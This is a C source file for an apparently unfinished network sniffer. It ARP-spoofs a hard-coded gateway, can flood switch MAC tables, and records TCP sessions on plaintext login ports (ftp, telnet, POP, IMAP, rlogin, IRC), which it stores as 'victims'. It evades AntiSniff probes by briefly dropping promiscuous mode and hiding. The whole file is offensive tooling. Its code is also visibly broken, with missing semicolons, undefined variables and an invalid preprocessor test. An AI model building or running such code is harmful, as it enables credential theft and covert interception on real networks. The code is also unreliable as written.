
#include <pcap.h>
#include <libnet.h>

#define ETH_ALEN 6

#define ETH_MTU 	1500
#define ETH_P_IP	0x0800
#define INTERFACE	"eth0"

#define BLOCKLEN	(PAGE_SIZE - sizeof(void *))

#define WATCH_ALL
//#define WATCH_LOGGED
#define DROP_PROMISC

/* Average over X packets */
/* The higher the value, the fewer false positives.
 * However, if the NUM_PKTS is TOO large, we may get caught before we even 
 * accumulate enough packets for accurate statistics! See the HIDEOUT & 
 * comments for more info..
 */
#define NUM_PKTS_SHIFT 2
#define NUM_PKTS 8

/* 
 * Secs to wait for the bad men to go away :)
 */
#define HIDEOUT_MAX	20000000 /* 20 sec max */
#define HIDEOUT_MIN	5000000 /* 5 sec min */

#define randhide()	\
	((rand() % (HIDEOUT_MAX - HIDEOUT_MIN)) + HIDEOUT_MIN)

/* Use this to define your own maximum load at which to bail out */
/* Units are usecs per packet */
/* Careful! Your machine may drop packets at the kernel level (esp if you have
 * CPU_IS_TOO_SLOW set in networking options)
 * Fast machines may get alot of false positives for ftp however..
 */
#define UMAX_LOAD	0700 /* 0.7ms per packet. 0 is Inf */

/* This causes the algorithm to treat dead time as if a packet was coming
 * every BASELINE usecs. Useful for intermittent traffic networks */
#define BASELINE	4000 /* 4ms */
    
/* This option controls if we watch for the AntiSniff magic packets, in
 * addition to our own address (in case they are sending the ping before we
 * detected a change in load)
 * Note, this is a definable option because it is possible to use this against
 * us, and send these packets all the time just to shut us down */   
#define ANTIMAGIC

#ifdef  ANTIMAGIC
# define MAGIC1	"ff:00:00:00:00:00" /* Method #1 for Win* */
# define MAGIC2	"66:66:66:66:66:66" /* AntiSniff user specified */
# define MYADDR	"fe:ed:de:ad:be:ef" /* Undefine and decrement NMAGIC, and
				       change the hex_addrlist to not watch
				       for your address */
# define NMAGIC		3	    /* Number of magic eth addrs to search */
char *hex_addrlist[] = { MAGIC1, MAGIC2, MYADDR };
char h_dest[NMAGIC][ETH_ALEN];
#endif

#define NCONNECTS	80
#define TCPLOG		"test"

#define FORWARD_ETHER

#define ARP_SNATCH	"00:24:42:44:44:45"
#define GATEWAY_ETHER	"00:50:53:8B:B0:73"
#define GATEWAY_IP	"130.126.44.1"
#define IP_BROADCAST	"130.126.47.255"
#define IP_NETMASK	"255.255.252.0"
/* This doesn't work on decent switches.. and on bad ones, my guess is
     * you'd have to redo it every so often anways.. */
/*#define FILL_TABLE	100000*/

/* Actually, this debug option prints out some pretty useful stats you can use
 * to set UMAX_LOAD */
/*#define DEBUG */

#ifdef DEBUG
# define PRINTF(a...)  printf(##a)
#else
# define PRINTF(x...)
#endif

struct netload
{
    struct timeval last;
    int stats;
};

#if (sizeof(unsigned int) == 4)
typedef unsigned int ipaddr
#else
#error What_the_hell_should_I_use_for_an_ipaddr
#endif

/* The following structures can all be used interchangably, and should work
 * independant of compiler & padding */
struct ethframe
{
    unsigned char eth[sizeof (struct libnet_ethernet_hdr)];
    unsigned char buf[ETH_MTU - sizeof(struct libnet_ethernet_hdr)];
};

struct arpframe
{
    unsigned char eth[sizeof (struct libnet_ethernet_hdr)];
    unsigned char arp[sizeof (struct libnet_arp_hdr)];
    unsigned char buf[ETH_MTU - sizeof(struct libnet_ethernet_hdr) - 
		      sizeof(struct libnet_arp_hdr)];
};

struct tcpframe
{
    unsigned char eth[sizeof(struct libnet_ethernet_hdr)];
    unsigned char ip[sizeof(struct libnet_ip_hdr)];
    unsigned char tcp[sizeof(struct libnet_tcp_hdr)];
    char buff[ETH_MTU - sizeof(struct libnet_ethernet_hdr) 
	      - sizeof(struct libnet_ip_hdr) - sizeof(struct libnet_tcp_hdr)];
};

struct dnsframe
{
    unsigned char eth[sizeof(struct libnet_ethernet_hdr)];
    unsigned char ip[sizeof(struct libnet_ip_hdr)];
    unsigned char udp[sizeof(struct libnet_udp_hdr)];
    struct libnet_dns_hdr dns;   	
    char buf[ETH_MTU - sizeof(struct libnet_ethernet_hdr) 
	     - sizeof(struct libnet_ip_hdr) - sizeof(struct libnet_udp_hdr) 
	     - sizeof(struct libnet_dns_hdr)];
};

struct eth_pair
{
    unsigned char eth[ETH_ALEN];
    ipaddr ip;
};

struct dnsentry
{
      ipaddr inet_addr;
      char *hostname;	    
};

struct queue
{
    int nelem;
    struct vlist *head;
    struct vlist *tail;
};

struct vlist {
    struct victim *vict;
    struct vlist *next;
};

struct dlist {
    char data[BLOCKLEN];
    struct dlist *next;
};

struct victim
{
    unsigned long saddr;
    unsigned long daddr;
    unsigned short sport;
    unsigned short dport;
    struct dlist *data;
};

unsigned char zero[ETH_ALEN]	= {0,    0,    0,    0,    0,    0};

/* TODO: Ping the entire broadcast space 1 at a time.. listen for responses, 
 * and then build a list.. Or file.. 
 * 
 * This prolly will work for almost all switches.. I can't imagine a switch
 * that somehow implicitly knows which IP's are alive and valid at all times..
 * Such a switch couldn't even depend on arp, because what if a host had
 * an /etc/ethers file? 
 */
struct eth_pair *get_dest(ipaddr broadcast, ipaddr netmask)
{
    static struct eth_pair pair;
    int rnd = rand();

    memcpy(pair.eth, &rnd, 4);
    pair.ip = (rand() & (~netmask)) | (broadcast & netmask);
 
    return &pair;
}

void forward_ether(struct link_int *iface, char *dev, struct ethframe *ef,
	    	    unsigned char *dst)
{
    memcpy(ef->ether_dhost, dst, ETH_ALEN);
    if(libnet_write_link_layer(iface, dev, ef, 
		((struct libnet_ip_hdr *)ef->ip)->ip_len + ETH_H) == -1)
	perror("Write link layer");
}

void write_ipether(struct link_int *iface, char *dev, struct eth_pair *dst, 
		   struct eth_pair *src)
{
    unsigned char pkt[ETH_H + IP_H + UDP_H];
    
    libnet_build_ethernet(dst->eth, src->eth, ETHERTYPE_IP, NULL, 0, pkt);
    libnet_build_ip(UDP_H, 0, 0, 0, 2, IPPROTO_UDP, src->ip, dst->ip,
	    NULL, 0, pkt + ETH_H);
    libnet_build_udp(rand() % (0xffff-1024) + 1024, rand() % 1024, 
		     NULL, 0, pkt + ETH_H + IP_H);
    if(libnet_do_checksum(pkt+ETH_H, IPPROTO_IP, IP_H) == -1)
	perror("ipv4 cksum");
    if(libnet_do_checksum(pkt+ETH_H, IPPROTO_UDP, UDP_H) == -1)
	perror("ipv4 cksum");
    if(libnet_write_link_layer(iface, dev, pkt, sizeof(pkt)) 
	    != sizeof(pkt))
	perror("Write link layer");
}


/* TODO: Also want to try an experimental function which puts all hw addrs 
 * on the switch into my port
 */
void fill_port_table(struct link_int *iface, char *dev, 
		     ipaddr broadcast, ipaddr netmask, int nfill)
{
    int rnd;
    struct eth_pair src, *dst;
    
    while(nfill--)
    {
	rnd = rand();
	memcpy(src.eth, &rnd, 4);
	src.ip = (rand() & (~netmask)) | (broadcast & netmask);
	dst = get_dest(broadcast, netmask);
	write_ipether(iface, dev, dst, &src);
    }
    
}

/* TODO: List of all IP's to snoop */
void arp_spoof_request(struct link_int *iface, char *dev, 
	unsigned char *gwip, unsigned char *tgtip, unsigned char *eth)
{
    unsigned char pkt[ARP_H + ETH_H];
    
    libnet_build_ethernet(eth, eth, ETHERTYPE_ARP, NULL, 0, pkt); 
    libnet_build_arp(ARPHRD_ETHER, ETH_P_IP, ETH_ALEN, 4, ARPOP_REQUEST, eth,
	    gwip, zero, tgtip, NULL, 0, pkt + ETH_H);
    if(libnet_write_link_layer(iface, dev, pkt, sizeof(pkt)) 
	    != sizeof(pkt))
	perror("Write link layer");
}

/* We really only need to spoof the gw.. It's just lagged enough usually that
 * we might just win the race :)*/
void arp_spoof_reply(struct link_int *iface, char *dev, 
	struct arp_hdr *origreq, unsigned char *reply)
{
    unsigned char pkt[ETH_H + ARP_H];
    
    libnet_build_ethernet(origreq->ar_sha, reply, ETHERTYPE_ARP, NULL, 0, pkt); 
    libnet_build_arp(ARPHRD_ETHER, ETH_P_IP, ETH_ALEN, 4, ARPOP_REPLY,
	    reply, origreq->ar_tip, origreq->ar_sha, origreq->ar_sip, NULL, 0, pkt + ETH_H);
    if(libnet_write_link_layer(iface, dev, pkt, sizeof(pkt)) 
	    != sizeof(pkt))
	perror("Write link layer");
}

char *hex2eth(char *hexaddr)
{
    static char h_dest[ETH_ALEN];
    int i;
    
    for(i=0; i < ETH_ALEN && hexaddr && *hexaddr != 0; i++, hexaddr++)
    {
	h_dest[i] = strtol(hexaddr, NULL, 16) & 0xff;
	hexaddr = strchr(hexaddr, ':');
    }
    return h_dest;
}

int init_magic(); /* FIXME: CODEME! */

/* FIXME: need a hashtable! */
int ismagic(struct hashtable *ht, struct ethframe *fr)
{
    return (libhash_get(ht, 
	    libhash_key(((struct libnet_ethernet_hdr *)fr->eth)->h_source,
		ETH_ALEN))) == NULL ? 1 : 0;
}

void closeintf(pcap_t *pd)
{
    pcap_close(pd);
}

pcap_t *openintf(char *dev)
{
    pcap_t *pd;
    char idiotic[1024];
   
    if(!(pd = pcap_open_live(dev, ETH_MTU, 1, 0, idiotic)))
    {
	perror(idiotic);
	exit(1);
    }
    return pd;
}

void init_load(struct netload *load)
{
    gettimeofday(&load->last, NULL);
    load->stats = BASELINE;
}

/*
 * The algorithm is as follows:
 *
 * Say you have N numbers coming in
 * You don't want to make an array to hold them all in to average
 * So you do this: avg = (N*avg + number)/N
 * That reduces to avg = avg + number/N or avg += number/N
 *
 * But we have no idea how many packets will come in, So what happens if you 
 * get past N? Why you have to subtract avg/N off so you don't just head on off
 * to +Infinity
 *
 * Example with real numbers: 
 * So if the time difference were 12 each time, after 8 packets the avg would 
 * be up to 12, so we add the new one (12/8) then subtract avg/8 (12/8) to 
 * stabalize.
 * 
 * Lower stats mean more load. (Units of usecs/packet)
 */
int account_load(struct netload *load)
{
    struct timeval tv;
    register int elapsed;
    gettimeofday(&tv, NULL);
    
    PRINTF("%d sec, %6d usec elapsed\t", tv.tv_sec - load->last.tv_sec,
	    tv.tv_usec - load->last.tv_usec);

    /* Make things a little more normalized for very low traffic networks */
    /* essentially we are simulating a packet every 5 msec */
    if(tv.tv_sec > load->last.tv_sec || tv.tv_usec - load->last.tv_usec >
	    BASELINE)
	elapsed = BASELINE;
    else
	elapsed = tv.tv_usec - load->last.tv_usec;
    load->last = tv;

#if defined(READABLE) 
    load->stats += elapsed / NUM_PKTS - load->stats / NUM_PKTS;
#else
    load->stats += (elapsed - load->stats) >> NUM_PKTS_SHIFT;
#endif
    
    PRINTF("Stats %6d\tDelta stats %d\n", load->stats, (elapsed - load->stats) >>
	    NUM_PKTS_SHIFT);
    /*  Remember, lower stat means higher load */
    if(load->stats < UMAX_LOAD)
    {
	PRINTF("Threshold exceeded. Network load %d\n", load->stats);
	load->stats = BASELINE;
	return 1;
    }
    
    return 0;
}

void process_packet(struct hashtable *vtable, struct queue *vqueue, struct tcpframe *tf)
{
    struct victim *vict;
    
    if(((struct libnet_tcp_hdr *)tf->tcp)->th_flags & TH_SYN)
    {
	vict = create_victim(tf);
	libhash_put(vtable, vict, vict->daddr);
	enque(vqueue, vict);
	if(vqueue->nelem >= MAXCONNECTS)
	{
	    vict = deque(vqueue);
	    libhash_delete(vtable, vict->daddr);
	}
    }
    else if(((struct libnet_tcp_hdr *)tf->tcp)->th_flags & TH_FIN
	    ||((struct libnet_tcp_hdr *)tf->tcp)->th_flags & TH_RST)
    {
	vict = libhash_delete(vtable, vict->daddr); 
	delque(vqueue, vict);
	add_vict_data(vict, tf);
	print_victim(vict);
	return; 
    }
    add_vict_data(vict, tf);
    
}

int ip_input(struct hashtable *vtable, struct queue *vqueue, struct tcpframe *tf)
{
    static struct netload tcpload;
    
    if (tf->ether_type != ETHERTYPE_IP 
	    || ((struct libnet_ip_hdr *)tf->ip)->protocol != 6)
	return 0;

    switch (ntohs(tcp->dest))
    {
    case 21:			/* ftp */
    case 23:			/* telnet */
    case 87:			/* tty link */
    case 106:			/* poppasswd */
    case 109:			/* pop2 */
    case 110:			/* pop3 */
    case 143:			/* imap2 */
    case 513:			/* rlogin */
    case 761:			/* kerberos passwd */
    case 6666:			/* Hrmm.. Who IRC's? :) */
    case 6667:
	if(account_load(&tcpload))
	    return -1;
	process_packet(vtable, vqueue, tf); 
	return 1; 
    }
    return 0;
}

int main(int argc, char **argv)
{
    struct link_int *intf;
    struct timeval tv;
    struct arpframe *fr;
    struct pcap_pkthdr h;
    struct hashtable iptable;
    struct queue vqueue;
    unsigned char gweth[ETH_ALEN];
    unsigned char boguseth[ETH_ALEN];
    ipaddr gwip, broadcast, netmask;
    pcap_t *pd;
    
    gettimeofday(&tv, NULL);
    
    srand(tv.tv_sec ^ tv.tv_usec ^ (getpid()<<15));

#ifdef ARP_SNATCH
    gwip = libnet_name_resolve(GATEWAY_IP, 0);
    memcpy(gweth, hex2eth(GATEWAY_ETHER), ETH_ALEN)
    memcpy(boguseth, hex2eth(ARP_SNATCH), ETH_ALEN)
#endif
    
    if((intf = libnet_open_link_interface(INTERFACE, NULL)) == NULL)
    {
	perror("open intf");
	exit(1);
    }
    
    if((pd = pcap_open_live(INTERFACE, ETH_MTU, 1, 0, NULL)) == NULL)
    {
	perror("pcap_open");
	exit(1);
    }
    
#ifdef FILL_TABLE
    broadcast = libnet_name_resolve(IP_BROADCAST, 0);
    netmask = libnet_name_resolve(IP_NETMASK, 0);
    fill_port_table(intf, INTERFACE, broadcast, netmask, FILL_TABLE);
#endif

    while(1)
    {
	fr = (struct arpframe *) pcap_next(pd, &h);

#ifdef ARP_SNATCH	
	if(((struct libnet_ethernet_hdr *)fr->eth)->ftype == htons(ETHERTYPE_ARP)
		&& !memcmp(((struct libnet_arp_hdr *)fr->arp)->ar_tip, &gwip, 4))
	{
	    arp_spoof_reply(intf, INTERFACE, (struct libnet_arp_hdr *)fr->arp,
		    boguseth);
	    /* Todo: Snatch arp reply.. and sniff two way communications.. */
	    continue;
	}

# ifdef FORWARD_ETHER
	/* Redirect packet here.. */
	forward_ether(fr, gweth);
# endif
#endif	

#ifdef ANTIMAGIC
	if(ismagic(eviltable, (struct ethframe *)fr))
	{
# ifdef DROP_PROMISC
	    closeintf(pd);
	    usleep(randhide());
	    pd = openintf(INTERFACE);
# else
	    usleep(randhide());
# endif
	}
#endif

#ifdef WATCH_ALL
	if(account_load(&rawload))
	{
# ifdef DROP_PROMISC
	    closeintf(pd);
	    usleep(randhide());
	    pd = openintf(INTERFACE);
# else
	    usleep(randhide());
# endif
	}
#endif
	if(ip_input(&iptable, &vqueue, (struct tcpframe *) fr) == -1)
	{
# ifdef DROP_PROMISC
	    closeintf(pd);
	    usleep(randhide());
	    pd = openintf(INTERFACE);
# else
	    usleep(randhide());
# endif
	}	    
    }	
}
